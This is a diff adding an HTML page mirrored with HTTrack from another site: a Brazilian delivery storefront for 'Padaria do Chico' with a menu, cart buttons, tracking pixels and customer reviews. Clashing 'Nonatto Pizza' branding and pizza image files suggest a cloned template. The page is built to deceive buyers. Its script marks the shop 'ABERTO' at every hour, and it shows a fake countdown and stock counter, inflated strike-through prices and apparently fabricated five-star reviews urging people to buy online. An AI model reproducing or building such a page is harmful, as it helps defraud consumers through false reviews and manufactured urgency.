@@ -1,0 +1,1338 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br" translate="no">
+<!-- Mirrored from pizzariamilano.fun/n1/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 20 Apr 2025 23:24:01 GMT -->
+
+<head>
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+
+	<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+	<meta name="google" content="notranslate">
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="shortcut icon" type="image/jpg" href="images/logo.jpg">
+	<title>Padaria do Chico - Faça seu pedido!</title>
+	<meta name="description"
+		content="Faça seu pedido online na Padaria do Chico. Acesse e peça agora pelo delivery food!">
+	<link type="text/css" href="css/delivry.css" rel="stylesheet">
+	<style type="text/css">
+		h1,
+		h2 {
+			color: #5b0e5c;
+		}
+
+		header#topo .cover {
+			background-color: #5b0e5c;
+		}
+
+		header#topo .info h1 {
+			color: #000000;
+		}
+
+		header#topo .info .icones a {
+			color: #000000;
+			border-color: #000000;
+		}
+
+		header#topo .cover .logo {
+			background: #000000;
+		}
+
+		header#topo #menuCategorias {
+			background: #000000;
+		}
+
+		header#topo .categorias a {
+			border-top-color: #000000;
+		}
+
+		footer {
+			background: #5b0e5c;
+		}
+
+		footer#carrinho .container .icone span {
+			color: #5b0e5c;
+		}
+
+		.btn,
+		a.voltar,
+		.btnSair,
+		.btnFidelidade,
+		.btnGoogle,
+		.btnEmail,
+		.btnSemCadastro {
+			background: #5b0e5c;
+		}
+
+		.qtdeProduto i:hover {
+			color: #000000;
+		}
+
+		.lista .item .col .nomeProduto {
+			color: #5b0e5c;
+		}
+
+		main#lista .produtos .item a:hover {
+			border: 2px solid #000000;
+		}
+
+		main#lista h1,
+		h2 {
+			color: #000000
+		}
+
+		#pedido .entrega .radio label input[type="radio"]:checked,
+		#pedido .entrega .radio label:hover {
+			background: #5b0e5c;
+		}
+
+		#pedido .pagamentos input[type="radio"]:checked+label::before,
+		#detalhesProduto .info2 .opcoes input[type="checkbox"]:checked+label::before,
+		#pedido .trocarPontos input[type="checkbox"]:checked+label::before {
+			background-color: #5b0e5c;
+			border: 2px solid #5b0e5c;
+		}
+
+		.selecionado {
+			border: 2px solid #5b0e5c;
+		}
+
+		#meuCarrinho button.fechar,
+		#rastreamento .registro span.passou {
+			background: #000000;
+		}
+
+		span.estoque i {
+			color: #5b0e5c;
+		}
+	</style>
+	<meta name="theme-color" content="#5b0e5c">
+	<meta name="apple-mobile-web-app-capacity" content="yes">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar" content="#5b0e5c">
+	<meta name="apple-mobile-web-app-status-bar-style" content="#5b0e5c">
+	<meta name="apple-mobile-web-app-title" content="Nonatto Pizza">
+	<!-- SweetAlert2 -->
+	<script src="npm/sweetalert2%4011.js"></script>
+	<link rel="stylesheet" href="icone91f.css?family=Material+Icons">
+
+
+	<script src="js/latest_1.js" data-utmify-prevent-subids="" async="" defer=""></script>
+	<!-- Meta Pixel Code -->
+	<script>
+		window.pixelId = "67e9ddb04c1edd3fca011cdf";
+		var a = document.createElement("script");
+		a.setAttribute("async", "");
+		a.setAttribute("defer", "");
+		a.setAttribute("src", "../../cdn.utmify.com.br/scripts/pixel/pixel.js");
+		document.head.appendChild(a);
+	</script>
+
+	<script src="../../cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids
+		async defer></script>
+
+	<link rel="stylesheet" href="cart.css">
+	<script defer src="cart.js"></script>
+
+</head>
+
+<body>
+	<div id="opacidade" class="fechar"></div>
+	<div>
+		<header id="topo">
+			<div class="cover main" style="
+            background-image: url(images/cover.jpg);
+          ">
+				<div class="logo">
+					<figure>
+						<img src="images/logo.jpg" alt="Nonatto pizza" title="Nonatto pizza">
+					</figure>
+				</div>
+				<div class="borda"></div>
+			</div>
+			<div class="container">
+				<div class="info">
+					<h1>Padaria do Chico</h1>
+					<div class="icones">
+						<a href="index-1.html" title="Instagram" target="_blank">
+							<i class="fab fa-instagram"></i>
+						</a>
+						<a class="informacoes" href="#info" title="Info">
+							<i class="fa-solid fa-info"></i>
+						</a>
+					</div>
+					<div class="detalhe">
+						<span><i class="fa-solid fa-coins"></i> Pedido Mínimo
+							<b>R$ 19,99 (somente hoje) </b></span>
+						<div>
+							<span><i class="fa-solid fa-motorcycle"></i> <b>30-50</b> min</span> • <span
+								style="color: #077c22">Grátis</span>
+						</div>
+					</div>
+					<div class="detalhe" style="gap: 3px;">
+						<i class="fa fa-map-marker-alt" aria-hidden="true"></i><span id="localCidade">Cidade</span> -
+						<span id="localEstado">UF</span> • Padaria disponível somente em Viamão!
+					</div>
+					<div class="detalhe">
+						<i class="fa fa-star" aria-hidden="true"></i><b>4,9</b> (2.136 avaliações)
+					</div>
+					<div class="aberto">
+						<i class="fa-solid fa-circle btn-pisca"></i>
+						<span id="status-loja">ABERTO</span>
+						<i class="fa-regular fa-clock horario" id="icone-relogio" style="display: none;"></i>
+						<span class="horario" id="horario-fechamento" style="display: none;"></span>
+					</div>
+
+					<script>
+						function atualizarStatusLoja() {
+							const agora = new Date();
+							const horas = agora.getHours();
+							const statusLoja = document.getElementById("status-loja");
+							const iconeRelogio = document.getElementById("icone-relogio");
+							const horarioFechamento = document.getElementById("horario-fechamento");
+
+							if (horas >= 0 && horas < 2) {
+								statusLoja.textContent = "ABERTO";
+								horarioFechamento.textContent = "até 02:00";
+								iconeRelogio.style.display = "inline";
+								horarioFechamento.style.display = "inline";
+							} else if (horas >= 8 && horas < 23) {
+								statusLoja.textContent = "ABERTO";
+								iconeRelogio.style.display = "none";
+								horarioFechamento.style.display = "none";
+							} else {
+								statusLoja.textContent = "ABERTO";
+								iconeRelogio.style.display = "none";
+								horarioFechamento.style.display = "none";
+							}
+						}
+
+						atualizarStatusLoja();
+					</script>
+					<!-- <div class="detalhe mostrarHorario">
+						<i class="fa-solid fa-clock"></i> Horário de Funcionamento
+						<span><i class="fa-solid fa-angle-down"></i></span>
+					</div> -->
+					<!-- <div class="horarios">
+						<div class="item">
+							<div>Segunda-feira</div>
+							<div>10:00 ~ 23:30</div>
+						</div>
+						<div class="item">
+							<div>Terça-feira</div>
+							<div>10:00 ~ 23:30</div>
+						</div>
+						<div class="item">
+							<div>Quarta-feira</div>
+							<div>10:00 ~ 23:30</div>
+						</div>
+						<div class="item">
+							<div>Quinta-feira</div>
+							<div>10:00 ~ 23:30</div>
+						</div>
+						<div class="item">
+							<div>Sexta-feira</div>
+							<div>10:00 ~ 23:30</div>
+						</div>
+						<div class="item">
+							<div>Sábado</div>
+							<div>10:00 ~ 23:30</div>
+						</div>
+						<div class="item">
+							<div>Domingo</div>
+							<div>10:00 ~ 23:30</div>
+						</div>
+					</div> -->
+				</div>
+			</div>
+			<div id="menuCategorias">
+				<div class="container">
+					<div class="categorias" style="">
+						<a href="#pague-1-leve-2" title="Combos">
+							Mais pedidos
+						</a>
+						<a href="#acai" title="Combos - Zero Açúcar"> Padaria </a>
+						<a href="#doces" title="Combos - Zero Açúcar"> Bebidas </a>
+
+					</div>
+				</div>
+			</div>
+		</header>
+		<main id="lista" style="padding-bottom: 0;">
+			<div class="container">
+				<div class="alert alert-success">
+					<b>Entrega Grátis</b> para <b id="localCidade">sua região</b>!
+				</div>
+				<div class="alert alert-success" style="color: rgb(0, 0, 0);outline: 2px solid #000000;">
+					Aproveite nossa <b>promoção com preços irresistíveis</b> 🖤
+				</div>
+				<div id="pague-1-leve-2" class="categoria">
+					<h2>Mais pedidos</h2>
+					<div class="produtos">
+						<div class="item">
+							<div class='disponivel'>
+								<div class="texto">
+									<h3>Pão de queijo com Nutella!</h3>
+									<span>Crocância, Nutella e aquele cheiro de pão saindo do forno!</span>
+									de <span class="precoPromocao">R$ 19,90</span> por apenas
+									<span class="preco"> R$ 10,00 un. </span>
+									<button class="add-to-cart" data-id="pao-de-queijo"
+										data-name="Pão de Queijo com Nutella" data-price="10.00">
+										Adicionar
+									</button>
+
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/individual.jpg" width="110px" height="110px" loading="lazy"
+											alt="(Apenas Entrega) Padaria do Chico">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class='disponivel'>
+								<div class="texto">
+									<h3>Cachorro Quente Duplo!</h3>
+									<span>Duas salsichas, queijo ralado e pão artesanal — o combo que destrói a
+										fome.</span>
+									de <span class="precoPromocao">R$ 21,99</span> por
+									<span class="preco"> R$ 15,00 un. </span>
+									<button class="add-to-cart" data-id="cachorro-quente"
+										data-name="Cachorro Quente Duplo" data-price="15.00">
+										Adicionar
+									</button>
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/casal.jpg" width="110px" height="110px" loading="lazy"
+											alt="(Apenas Entrega) Padaria do Chico	">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class='disponivel pulsar' style='border: 2px solid #077c22;'>
+								<div class="texto">
+									<span class="tag-destaque">MAIS PEDIDO EM NOSSA PADARIA!</span>
+									<h3>Croissant Grande de Morango</h3>
+									<span>Sabe aquele doce que te faz sorrir? É esse.</span>
+									<span style="
+									color: #474747; background: #e8e8e8; padding: 10px 10px; margin-bottom: 2px; margin-top: 2px;
+									border-radius: 8px; text-align: left;">Crocante por fora, cremoso por dentro e com morango de verdade!
+										🍓</span>
+									de <span class="precoPromocao">R$ 95,80</span> por
+									<span class="preco" style="font-size: 20px;"> <b
+											style="background: #077c22; display: block; color: white; border-radius: 8px; padding: 2px 8px; margin: 4px; margin-left: 0px; width: fit-content;">R$
+											15,00</b> </span>
+									<span><i>🚨 Últimas unidades com preço promocional!</i></span>
+									<span class="estoque" style="margin-top: 4px;">🔥 Apenas <b
+											style="background: red; color: white; border-radius: 5px; padding: 2px 8px;"><span
+												id="estoqueCombo">8</span>
+											unidades</b> com esse preço especial</span>
+									<button class="add-to-cart" data-id="croissant-morango"
+										data-name="Croissant Grande de Morango" data-price="15.00">
+										Adicionar
+									</button>
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/familia.webp" width="110px" height="110px" loading="lazy"
+											alt="(Apenas Entrega) Padaria do Chico">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div class="alert alert-success"
+							style="color: red;outline: 2px solid red; background-color: rgb(255, 217, 217);">
+							<b>A promoção vai acabar em:</b>
+							<div class="countdown">
+								<!-- <div class="box">
+								<span id="days">00</span>
+								<p>Dias</p>
+								</div>
+								<div class="box">
+								<span id="hours">00</span>
+								<p>Horas</p>
+								</div> -->
+								<div class="box">
+									<span id="minutes">00</span>
+									<p>Minutos</p>
+								</div>
+								<div class="box">
+									<span id="seconds">00</span>
+									<p>Segundos</p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+
+				<div id="acai" class="categoria">
+					<h2>Delícias da Padaria!</h2>
+					<div class="produtos">
+						<div class="item">
+							<div class='disponivel'>
+								<div class="texto">
+									<h3>Croissant Grande de Chocolate</h3>
+									<span>Massa amanteigada com recheio cremoso de chocolate. Prazer em cada
+										mordida! 🍫</span>
+									<h3> por apenas </h3>
+									<span class="preco"> R$ 17,90 </span>
+									<button class="add-to-cart" data-id="croissant-chocolate"
+										data-name="Croissant Grande de Chocolate" data-price="17.90">
+										Adicionar
+									</button>
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/calabresa.png" width="110px" height="110px" loading="lazy"
+											alt="(Apenas Entrega) Padaria do Chico">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class='disponivel'>
+								<div class="texto">
+									<h3>Cuca Caseira de Chocolate Meio Amargo</h3>
+									<span>Massa fofinha com cobertura crocante e muito chocolate derretido! 🤎</span>
+									<h3> por apenas </h3>
+									<span class="preco"> R$ 14,90 </span>
+									<button class="add-to-cart" data-id="cuca-chocolate"
+										data-name="Cuca Chocolate Meio Amargo" data-price="14.90">
+										Adicionar
+									</button>
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/quatroqueijos.png" width="110px" height="110px" loading="lazy"
+											alt="(Apenas Entrega) Padaria do Chico">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class='disponivel'>
+								<div class="texto">
+									<h3>Cuca Caseira de Doce de Leite</h3>
+									<span>Doce de leite cremoso e massa amanteigada. Sabor que derrete no paladar!
+										🤤</span>
+									<h3> por apenas </h3>
+									<span class="preco" style="font-size: 20px;"> R$ 14,90 </span>
+									<button class="add-to-cart" data-id="cuca-doceleite"
+										data-name="Cuca Chocolate Doce de Leite" data-price="14.90">
+										Adicionar
+									</button>
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/bacon.png" width="110px" height="110px" loading="lazy"
+											alt="(Apenas Entrega) Padaria do Chico">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class='disponivel'>
+								<div class="texto">
+									<h3>Pancho Grelhado Artesanal</h3>
+									<span>Salsicha premium, pão artesanal e toque defumado na chapa. O lanche perfeito!
+										😋</span>
+									<h3> por apenas </h3>
+									<span class="preco"> R$ 9,90 </span>
+									<button class="add-to-cart" data-id="pancho-grelhado" data-name="Pancho Grelhado"
+										data-price="9.90">
+										Adicionar
+									</button>
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/portuguesa.png" width="110px" height="110px" loading="lazy"
+											alt="(Apenas Entrega) Padaria do Chico">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class='disponivel'>
+								<div class="texto">
+									<h3>Pastel Crocante (Tamanho Gigante) </h3>
+									<span>Massa fina e crocante com recheio generoso. Direto da Padaria do Chico pro
+										seu prato! 💥</span>
+									<h3> por apenas </h3>
+									<span class="preco"> R$ 9,90 </span>
+									<button class="add-to-cart" data-id="pastel-grande"
+										data-name="Pastel Crocante Gigante" data-price="9.90">
+										Adicionar
+									</button>
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/frangocomcatupiry.png" width="110px" height="110px"
+											loading="lazy" alt="(Apenas Entrega) Padaria do Chico">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class='disponivel'>
+								<div class="texto">
+									<h3>Brusqueta Italiana Artesanal</h3>
+									<span>Pão crocante, queijo derretido e o sabor clássico direto da Itália
+										🇮🇹!</span>
+									<h3> por apenas </h3>
+									<span class="preco"> R$ 11,90 </span>
+									<button class="add-to-cart" data-id="brusqueta-italiana"
+										data-name="Brusqueta Italiana Artesanal" data-price="11.90">
+										Adicionar
+									</button>
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/calabresacomcheddar.png" width="110px" height="110px"
+											loading="lazy" alt="(Apenas Entrega) Padaria do Chico">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div class="item">
+							<div class='disponivel'>
+								<div class="texto">
+									<h3>Coxinha Gigante de Frango</h3>
+									<span>Casquinha crocante, recheio suculento e tamanho pra matar a fome de verdade!
+										🔥</span>
+									<h3> por apenas </h3>
+									<span class="preco"> R$ 9,90 </span>
+									<button class="add-to-cart" data-id="coxinha-gigante"
+										data-name="Coxinha Gigante de Frango" data-price="9.90">
+										Adicionar
+									</button>
+								</div>
+								<div class="fotoProduto">
+									<figure>
+										<img src="sabores/modadacasa.png" width="110px" height="110px" loading="lazy"
+											alt="(Apenas Entrega) Padaria do Chico">
+									</figure>
+								</div>
+							</div>
+						</div>
+						<div id="doces" class="categoria">
+							<h2>BEBIDAS</h2>
+							<div class="produtos">
+								<div class="item">
+									<div class='disponivel'>
+										<div class="texto">
+											<h3>Água sem gás</h3>
+											<span>500ml</span>
+											<h3> por apenas </h3>
+											<span class="preco"> R$ 4,90 </span>
+											<button class="add-to-cart" data-id="agua-semgas" data-name="Água sem Gás"
+												data-price="4.90">
+												Adicionar
+											</button>
+										</div>
+										<div class="fotoProduto">
+											<figure>
+												<img src="sabores/brigadeiro.png" width="110px" height="110px"
+													loading="lazy" alt="(Apenas Entrega) Padaria do Chico">
+											</figure>
+										</div>
+									</div>
+								</div>
+								<div class="item">
+									<div class='disponivel'>
+										<div class="texto">
+											<h3>Coca-Cola Original</h3>
+											<span>350ml</span>
+											<h3> por apenas </h3>
+											<span class="preco"> R$ 7,90 </span>
+											<button class="add-to-cart" data-id="coca-cola-originallata"
+												data-name="Coca-Cola Original Lata" data-price="7.90">
+												Adicionar
+											</button>
+										</div>
+										<div class="fotoProduto">
+											<figure>
+												<img src="sabores/moarangocomnutella.jpg" width="110px" height="110px"
+													loading="lazy" alt="(Apenas Entrega) Padaria do Chico">
+											</figure>
+										</div>
+									</div>
+								</div>
+								<div class="item">
+									<div class='disponivel'>
+										<div class="texto">
+											<h3>Coca-Cola Zero</h3>
+											<span>350ml</span>
+											<h3> por apenas </h3>
+											<span class="preco" style="font-size: 20px;"> R$ 5,90 </span>
+											<button class="add-to-cart" data-id="coca-cola-zerolata"
+												data-name="Coca-Cola Zero Lata" data-price="5.90">
+												Adicionar
+											</button>
+										</div>
+										<div class="fotoProduto">
+											<figure>
+												<img src="sabores/beijinho.jpg" width="110px" height="110px"
+													loading="lazy" alt="(Apenas Entrega) Padaria do Chico">
+											</figure>
+										</div>
+									</div>
+								</div>
+								<div class="item">
+									<div class='disponivel'>
+										<div class="texto">
+											<h3>Guaraná Antarctica</h3>
+											<span>350ml</span>
+											<h3> por apenas </h3>
+											<span class="preco"> R$ 6,90 </span>
+											<button class="add-to-cart" data-id="guarana-lata"
+												data-name="Guaraná Antártica Lata" data-price="6.90">
+												Adicionar
+											</button>
+										</div>
+										<div class="fotoProduto">
+											<figure>
+												<img src="sabores/romeuejulieta.png" width="110px" height="110px"
+													loading="lazy" alt="(Apenas Entrega) Padaria do Chico">
+											</figure>
+										</div>
+									</div>
+								</div>
+								<div class="item">
+									<div class='disponivel'>
+										<div class="texto">
+											<h3>Fanta Laranja</h3>
+											<span>350ml</span>
+											<h3> por apenas </h3>
+											<span class="preco"> R$ 6,90 </span>
+											<button class="add-to-cart" data-id="fanta-laranjalata"
+												data-name="Fanta Laranja Lata" data-price="6.90">
+												Adicionar
+											</button>
+										</div>
+										<div class="fotoProduto">
+											<figure>
+												<img src="sabores/mm.png" width="110px" height="110px" loading="lazy"
+													alt="(Apenas Entrega) Padaria do Chico">
+											</figure>
+										</div>
+									</div>
+								</div>
+								<div class="item">
+									<div class='disponivel'>
+										<div class="texto">
+											<h3>Coca-Cola Original</h3>
+											<span>1,5l</span>
+											<h3> por apenas </h3>
+											<span class="preco"> R$ 10,90 </span>
+											<button class="add-to-cart" data-id="coca-colalitro"
+												data-name="Coca-Cola 1.5L Original" data-price="10.90">
+												Adicionar
+											</button>
+										</div>
+										<div class="fotoProduto">
+											<figure>
+												<img src="sabores/bananacomcanela.jpg" width="110px" height="110px"
+													loading="lazy" alt="(Apenas Entrega) Padaria do Chico">
+											</figure>
+										</div>
+									</div>
+								</div>
+								<div class="item">
+									<div class='disponivel'>
+										<div class="texto">
+											<h3>Coca-Cola Zero</h3>
+											<span>1,5l</span>
+											<h3> por apenas </h3>
+											<span class="preco"> R$ 9,90 </span>
+											<button class="add-to-cart" data-id="coca-colalitrozero"
+												data-name="Coca-Cola 1.5L Zero" data-price="9.90">
+												Adicionar
+											</button>
+										</div>
+										<div class="fotoProduto">
+											<figure>
+												<img src="sabores/prestigio.png" width="110px" height="110px"
+													loading="lazy" alt="(Apenas Retirada) Nonatto pizza">
+											</figure>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+		</main>
+		<main id="lista">
+			<div class="container">
+				<div class="alert">
+					<b style="font-size: 20px;">4,9</b><br>
+					<i class="fa fa-star" aria-hidden="true" style="color: goldenrod;"></i>
+					<i class="fa fa-star" aria-hidden="true" style="color: goldenrod;"></i>
+					<i class="fa fa-star" aria-hidden="true" style="color: goldenrod;"></i>
+					<i class="fa fa-star" aria-hidden="true" style="color: goldenrod;"></i>
+					<i class="fa fa-star-half-alt" aria-hidden="true" style="color: goldenrod;"></i>
+					<br>
+					<b>Mostrando 12 de 136 avaliações</b> • últimos 30 dias
+					<br>
+					<label style="color:gray">1.007 avaliações no total (todas as plataformas)</label>
+					<!-- <br>
+					<img style="width: 100%; height: auto;" src="img/super-restaurante.webp" alt="Super Restaurante"> -->
+				</div>
+				<div class="categoria">
+					<div class="produtos">
+
+						<!-- Avaliação 1 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Cinthia E******</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">Gente, dica: o preço do site é
+									SÓ no site. Fui na Padaria do Chico e me falaram. Comprei online e o croissant é
+									maravilhoso, sério. Não errem que nem eu kkkk.
+								</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r1.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+
+
+						<!-- Avaliação 2 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Alice</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">Acertaram DEMAIS nesse
+									salgado! Massa super macia e o recheio é muito caprichado. Perfeito pro lanche da
+									tarde. Já virei fã!"</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r2.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Luiza G*******</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">Gente esse dogão duplo da
+									Padaria do Chico é sensacional a massa é fofinha o queijinho em cima é tudo de bom
+									amei</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r3.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Ronald O********</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">Gente que delícia esse salgado
+									da Padaria massa macia e duas salsichas sério 10/10</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r4.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Carlla M*****</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">QUE DELÍCIA CHICOTONE 😋🎃 A
+									Padaria do Chico arrasou. Muito recheio, massa perfeita. Já quero outro!</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r5.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Gregory</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">Finalmente uma coxinha que não
+									é 90% massa. Essa aqui é recheada de verdade e o tempero do frango é ótimo. Adorei.
+								</p>
+							</div>
+							<div class="fotoProduto" style="margin-left: 15px;">
+								<figure style="margin: 0;">
+									<img src="images/r6.jpg" width="70px" height="70px" loading="lazy"
+										style="border-radius: 8px; cursor: pointer;" onclick="expandirImagem(this)">
+								</figure>
+							</div>
+						</div>
+						<!-- Avaliação 3 -->
+						<div class="item"
+							style="display: flex; align-items: center; justify-content: space-between; padding: 10px; border-bottom: 1px solid #ddd;">
+							<div class="avaliacao" style="flex-grow: 1;">
+								<h3 style="margin: 0; font-size: 16px; color: #333;">Jussara U******</h3>
+								<div style="display: flex; align-items: center;">
+									<span style="font-weight: bold; font-size: 14px; margin-right: 5px;">5,0</span>
+									<span class="estrelas" style="display: flex;">
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+										<i class="fa fa-star" style="color: goldenrod; font-size: 14px;"></i>
+									</span>
+									<span class="data" style="margin-left: auto; font-size: 12px; color: #888;"></span>
+								</div>
+								<p style="margin: 5px 0 0; font-size: 14px; color: #555;">Gente dica o preço do site da
+									Padaria é melhor. Fui na loja e era mais caro. Pedi online de montão e é maravilhoso
+								</p>
+							</div>
